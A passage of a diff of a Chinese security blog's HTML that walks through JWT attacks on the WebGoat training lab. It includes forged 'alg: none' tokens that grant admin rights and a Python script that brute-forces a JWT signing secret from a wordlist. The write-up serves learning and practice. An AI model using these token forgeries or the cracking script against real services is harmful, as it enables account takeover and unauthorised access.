class="hljs-punctuation">:</span> <span class="hljs-string">&quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;client_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-client-with-secret&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br>JWT 固定参数有： <br>iss： 发 行 人 <br>exp： 到 期 时 间 <br>sub： 主 题   <br>aud： 用 户    <br>nbf：在此之前不可用iat：发布时间<br>jti：JWT ID 用于标识该 JWT<br></code></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">声明（Claims）</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1416471934</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;user_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;read&quot;</span><span class="punctuation">,</span> <span class="string">&quot;write&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;authorities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;ROLE_ADMIN&quot;</span><span class="punctuation">,</span> <span class="string">&quot;ROLE_USER&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;client_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-client-with-secret&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">JWT 固定参数有： </span><br><span class="line">iss： 发 行 人 </span><br><span class="line">exp： 到 期 时 间 </span><br><span class="line">sub： 主 题   </span><br><span class="line">aud： 用 户    </span><br><span class="line">nbf：在此之前不可用iat：发布时间</span><br><span class="line">jti：JWT ID 用于标识该 JWT</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">签名（Signature）<br>服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是 JWT 的签名。<br>下面是一个用 HS256 生成 JWT 的代码例子<br>HMACSHA256(base64UrlEncode(header) + <span class="hljs-string">&quot;.&quot;</span> + base64UrlEncode(payload)<span class="hljs-punctuation">,</span>secret)<br></code></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">签名（Signature）</span><br><span class="line">服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是 JWT 的签名。</span><br><span class="line">下面是一个用 HS256 生成 JWT 的代码例子</span><br><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(payload)<span class="punctuation">,</span>secret)</span><br></pre></td></tr></table></figure>
 
 <p>1、用户端登录，用户名和密码在请求中被发往服务器<br>2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时，服务器并没有保存登录状态信息。<br>3、服务器将 JWT（通过响应）返回给客户端<br>4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中<br>5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态<br>6、服务器返回响应</p>
-<p><img src="/posts/43f09137/image-20220205111357736.png" srcset="/img/loading.gif" lazyload alt="image-20220205111357736"></p>
+<p><img src="/posts/43f09137/image-20220205111357736.png" alt="image-20220205111357736"></p>
 <h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="Javaweb-身份验证攻击-JWT-修改伪造攻击（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT-修改伪造攻击（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT 修改伪造攻击（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT 修改伪造攻击（WebGoat靶场）</h4><p>#了解 JWT 传输过程，验证机制</p>
 <p>#了解 JWT 结构，加解密过程及注意事项</p>
-<p><img src="/posts/43f09137/image-20220205111928593.png" srcset="/img/loading.gif" lazyload alt="image-20220205111928593"></p>
-<p><img src="/posts/43f09137/image-20220205112844469.png" srcset="/img/loading.gif" lazyload alt="image-20220205112844469"></p>
+<p><img src="/posts/43f09137/image-20220205111928593.png" alt="image-20220205111928593"></p>
+<p><img src="/posts/43f09137/image-20220205112844469.png" alt="image-20220205112844469"></p>
 <p>点击切换用户</p>
-<p><img src="/posts/43f09137/image-20220205112926183.png" srcset="/img/loading.gif" lazyload alt="image-20220205112926183"></p>
+<p><img src="/posts/43f09137/image-20220205112926183.png" alt="image-20220205112926183"></p>
 <p>抓包</p>
-<p><img src="/posts/43f09137/image-20220205112938904.png" srcset="/img/loading.gif" lazyload alt="image-20220205112938904"></p>
+<p><img src="/posts/43f09137/image-20220205112938904.png" alt="image-20220205112938904"></p>
 <p>发现access_token值为空</p>
 <p>再点击删除键</p>
-<p><img src="/posts/43f09137/image-20220205113051705.png" srcset="/img/loading.gif" lazyload alt="image-20220205113051705"></p>
-<p><img src="/posts/43f09137/image-20220205113106249.png" srcset="/img/loading.gif" lazyload alt="image-20220205113106249"></p>
+<p><img src="/posts/43f09137/image-20220205113051705.png" alt="image-20220205113051705"></p>
+<p><img src="/posts/43f09137/image-20220205113106249.png" alt="image-20220205113106249"></p>
 <p>数据包中发现access_token值</p>
 <p>到<a target="_blank" rel="noopener" href="https://jwt.io/">JSON Web Tokens - jwt.io</a>解密看下</p>
-<p><img src="/posts/43f09137/image-20220205114647600.png" srcset="/img/loading.gif" lazyload alt="image-20220205114647600"></p>
+<p><img src="/posts/43f09137/image-20220205114647600.png" alt="image-20220205114647600"></p>
 <p>发现”admin”: “false”,改为true就是管理员权限</p>
 <p>但是这样还不行 我们的签名部分无法修改</p>
 <p>注意：</p>
 <p>问题来了，因为 JWT 的声明内容变了，因此签名需要重新生成，生成签名又需要密码，我们没有密码呀？不要慌，我们直接去掉签名就好~修改头部为 None</p>
 <p>我们无法获取到密钥也就无法更改签名 那么我们就修改头部文件”alg”:”HS256”改为”alg”:”none”</p>
-<p><img src="/posts/43f09137/image-20220205120229198.png" srcset="/img/loading.gif" lazyload alt="image-20220205120229198"></p>
-<p><img src="/posts/43f09137/image-20220205120509791.png" srcset="/img/loading.gif" lazyload alt="image-20220205120509791"></p>
+<p><img src="/posts/43f09137/image-20220205120229198.png" alt="image-20220205120229198"></p>
+<p><img src="/posts/43f09137/image-20220205120509791.png" alt="image-20220205120509791"></p>
 <p>签名部分我们采用不加密也就是要留空</p>
 <p>在 HTTP 传输过程中，Base64 编码中的”&#x3D;”,”+”,”&#x2F;“等特殊符号通过 URL 解码通常容易产生歧义，因此产生了与 URL 兼容的 Base64 URL 编码</p>
 <p>也就是jwt在传输的时候要删掉这些符号</p>
 <p>最后结果</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ewogICJhbGciOiAib<span class="hljs-name">m9</span>uZSIKfQ.ewogICJpYXQiOiAx<span class="hljs-symbol">NjQ0</span>ODk<span class="hljs-number">1</span>ODIyLAogICJhZ<span class="hljs-name">G1</span>pbiI<span class="hljs-number">6</span>ICJ<span class="hljs-number">0</span>c<span class="hljs-symbol">nVlIiwKICAidXNlciI6</span>ICJUb<span class="hljs-number">20</span>iC<span class="hljs-symbol">n0</span>.<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAibm9uZSIKfQ.ewogICJpYXQiOiAxNjQ0ODk1ODIyLAogICJhZG1pbiI6ICJ0cnVlIiwKICAidXNlciI6ICJUb20iCn0.</span><br></pre></td></tr></table></figure>
 
 <p>完成</p>
 <p>再把这串编码拿到burp中修改</p>
 <p>攻击成功前提条件：服务器端没有验证是否有签名</p>
-<h4 id="Javaweb-身份验证攻击-JWT-密钥爆破攻击（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT-密钥爆破攻击（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT 密钥爆破攻击（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT 密钥爆破攻击（WebGoat靶场）</h4><p><img src="/posts/43f09137/image-20220205171436379.png" srcset="/img/loading.gif" lazyload alt="image-20220205171436379"></p>
+<h4 id="Javaweb-身份验证攻击-JWT-密钥爆破攻击（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT-密钥爆破攻击（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT 密钥爆破攻击（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT 密钥爆破攻击（WebGoat靶场）</h4><p><img src="/posts/43f09137/image-20220205171436379.png" alt="image-20220205171436379"></p>
 <p>JWT cracking——爆破，需要使用python脚本进行爆破，前提需自备字典。字典够强，就可以跑出来——<a target="_blank" rel="noopener" href="https://wws.lanzous.com/icZOyfpz24b"><a target="_blank" rel="noopener" href="https://lanzoux.com/icZOyfpz24b">m0re.txt - 蓝奏云 (lanzoux.com)</a></a><br>可以用我现在用的这个试试。测试呢嘛，就直接在源码里找到密码插进去就行。</p>
 <p>注意需要pip安装PyJWT</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> termcolor<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    jwt_str = <span class="hljs-string">R&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY0NDA1ODU2MCwiZXhwIjoxNjQ0MDU4NjIwLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.OaUiWkNbWlZ2I1owqEeGX1DXTBw3ZRH-Yf3GOX1mXtc&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;‪C:\\Users\\FATBOY\\Desktop\\m0re.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            key_ = line.strip()<br>            <span class="hljs-keyword">try</span>:<br>                jwt.decode(jwt_str, verify=<span class="hljs-literal">True</span>, key=key_)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="hljs-string">&#x27;green&#x27;</span>), <span class="hljs-string">&#x27;&lt;--&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="hljs-string">&#x27;green&#x27;</span>), <span class="hljs-string">&#x27;&lt;--&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> jwt.exceptions.InvalidSignatureError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br>                <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\bsorry! nothing be found.&#x27;</span>)<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = <span class="string">R&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY0NDA1ODU2MCwiZXhwIjoxNjQ0MDU4NjIwLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.OaUiWkNbWlZ2I1owqEeGX1DXTBw3ZRH-Yf3GOX1mXtc&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;‪C:\\Users\\FATBOY\\Desktop\\m0re.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! nothing be found.&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/43f09137/image-20220205185622947.png" srcset="/img/loading.gif" lazyload alt="image-20220205185622947"></p>
+<p><img src="/posts/43f09137/image-20220205185622947.png" alt="image-20220205185622947"></p>
 <p>脚本跑出来密匙为 <strong>business</strong></p>
 <p>继续去<a target="_blank" rel="noopener" href="https://jwt.io/%E8%A7%A3%E5%AF%86">https://jwt.io/解密</a></p>
-<p><img src="/posts/43f09137/image-20220205185819944.png" srcset="/img/loading.gif" lazyload alt="image-20220205185819944"></p>
-<p><img src="/posts/43f09137/image-20220205205823502.png" srcset="/img/loading.gif" lazyload alt="image-20220205205823502"></p>
-<h4 id="Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）</h4><p><img src="/posts/43f09137/image-20220205214813724-16440688965541.png" srcset="/img/loading.gif" lazyload alt="image-20220205214813724"></p>
-<p><img src="/posts/43f09137/image-20220205214855195-16440689380832.png" srcset="/img/loading.gif" lazyload alt="image-20220205214855195"></p>
+<p><img src="/posts/43f09137/image-20220205185819944.png" alt="image-20220205185819944"></p>
+<p><img src="/posts/43f09137/image-20220205205823502.png" alt="image-20220205205823502"></p>
+<h4 id="Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）</h4><p><img src="/posts/43f09137/image-20220205214813724-16440688965541.png" alt="image-20220205214813724"></p>
+<p><img src="/posts/43f09137/image-20220205214855195-16440689380832.png" alt="image-20220205214855195"></p>
 <p>查看日志</p>
-<p><img src="/posts/43f09137/image-20220205214912474.png" srcset="/img/loading.gif" lazyload alt="image-20220205214912474"></p>
+<p><img src="/posts/43f09137/image-20220205214912474.png" alt="image-20220205214912474"></p>
 <p>发现token解密下</p>
-<p><img src="/posts/43f09137/image-20220205214949819-16440689920343.png" srcset="/img/loading.gif" lazyload alt="image-20220205214949819"></p>
+<p><img src="/posts/43f09137/image-20220205214949819-16440689920343.png" alt="image-20220205214949819"></p>
 <p>更改失效时间</p>
-<p><img src="/posts/43f09137/image-20220205215204437.png" srcset="/img/loading.gif" lazyload alt="image-20220205215204437"></p>
+<p><img src="/posts/43f09137/image-20220205215204437.png" alt="image-20220205215204437"></p>
 <p>使用第四关绕过签名的方法</p>
-<p><img src="/posts/43f09137/image-20220205215938396.png" srcset="/img/loading.gif" lazyload alt="image-20220205215938396"></p>
-<p><img src="/posts/43f09137/image-20220205215912616.png" srcset="/img/loading.gif" lazyload alt="image-20220205215912616"></p>
+<p><img src="/posts/43f09137/image-20220205215938396.png" alt="image-20220205215938396"></p>
+<p><img src="/posts/43f09137/image-20220205215912616.png" alt="image-20220205215912616"></p>
 <p>payload</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ewogICJhbGciOiAib<span class="hljs-name">m9</span>uZSIKfQ.ewogICJpYXQiOiAx<span class="hljs-symbol">NTI2</span>MTMx<span class="hljs-symbol">NDExLAogICJleHAiOiAxNjQ0</span>MDc<span class="hljs-number">5</span>MTAzLAogICJhZ<span class="hljs-name">G1</span>pbiI<span class="hljs-number">6</span>ICJmYWxzZSIsCiAgI<span class="hljs-symbol">nVzZXIiOiAiVG9</span>tIgp<span class="hljs-number">9.</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAibm9uZSIKfQ.ewogICJpYXQiOiAxNTI2MTMxNDExLAogICJleHAiOiAxNjQ0MDc5MTAzLAogICJhZG1pbiI6ICJmYWxzZSIsCiAgInVzZXIiOiAiVG9tIgp9.</span><br></pre></td></tr></table></figure>
 
 <p>点击checkout抓包</p>
-<p><img src="/posts/43f09137/image-20220205215549153.png" srcset="/img/loading.gif" lazyload alt="image-20220205215549153"></p>
+<p><img src="/posts/43f09137/image-20220205215549153.png" alt="image-20220205215549153"></p>
 <p>更改数据</p>
-<p><img src="/posts/43f09137/image-20220205215817789-16440695032324.png" srcset="/img/loading.gif" lazyload alt="image-20220205215817789"></p>
+<p><img src="/posts/43f09137/image-20220205215817789-16440695032324.png" alt="image-20220205215817789"></p>
 <h4 id="Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）</h4><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/216457.html">Java代码审计入门：WebGoat8（再会） - FreeBuf网络安全行业门户</a></p>
 
-                
-              </div>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
             
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/JAVA%E5%AE%89%E5%85%A8/">#JAVA安全</a>
-      
-    </div>
-  
-</div>
-
-
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-02-04 00:00:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                        #JAVA安全
+                      </a>
+                    </span>
+                    
+                  </span>
               
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>JAVA安全-JWT安全及预编译 CASE 注入</div>
-      <div>http://example.com/posts/43f09137/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>F4tty</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年2月4日</div>
-        </div>
-      
-      
-      <div class="license-meta-item">
-        <div>许可协议</div>
-        <div>
-          
+          </div>
+          <div class="post-foot-prev">
             
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-              <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                <i class="iconfont icon-by"></i>
-              </span>
+              <a href="/posts/35386fe0/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
               </a>
             
-          
+          </div>
         </div>
-      </div>
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/posts/35386fe0/" title="向日葵 RCE复现">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">向日葵 RCE复现</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
       
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JAVA%E5%AE%89%E5%85%A8-JWT-%E5%AE%89%E5%85%A8%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91-CASE-%E6%B3%A8%E5%85%A5"><span class="toc-text">JAVA安全-JWT 安全及预编译 CASE 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5"><span class="toc-text">JAVA中的sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-mitigation"><span class="toc-text">SQL Injection(mitigation)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Javaweb-SQL-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB-%E9%A2%84%E7%BC%96%E8%AF%91%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%EF%BC%88WebGoat%E9%9D%B6%E5%9C%BA%EF%BC%89"><span class="toc-text">Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-JWT%EF%BC%9F"><span class="toc-text">什么是 JWT？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B"><span class="toc-text">案例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Javaweb-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%94%BB%E5%87%BB-JWT-%E4%BF%AE%E6%94%B9%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB%EF%BC%88WebGoat%E9%9D%B6%E5%9C%BA%EF%BC%89"><span class="toc-text">Javaweb-身份验证攻击-JWT 修改伪造攻击（WebGoat靶场）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Javaweb-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%94%BB%E5%87%BB-JWT-%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%EF%BC%88WebGoat%E9%9D%B6%E5%9C%BA%EF%BC%89"><span class="toc-text">Javaweb-身份验证攻击-JWT 密钥爆破攻击（WebGoat靶场）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Javaweb-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%94%BB%E5%87%BB-JWT%E4%BF%AE%E6%94%B9%E5%86%92%E5%85%85%E4%BC%AA%E9%80%A0%EF%BC%88WebGoat%E9%9D%B6%E5%9C%BA%EF%BC%89"><span class="toc-text">Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Javaweb-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%94%BB%E5%87%BB-JWT%E5%AE%89%E5%85%A8%E7%BB%93%E5%90%88SQL%E6%B3%A8%E5%85%A5%EF%BC%88WebGoat%E9%9D%B6%E5%9C%BA%EF%BC%89"><span class="toc-text">Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）</span></a></li></ol></li></ol></li></ol></li></ol>
+      
     </div>
   </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
 </div>
 
 
+<script src="/js/backtotop.js"></script>
 
 
 
-  
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
 
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
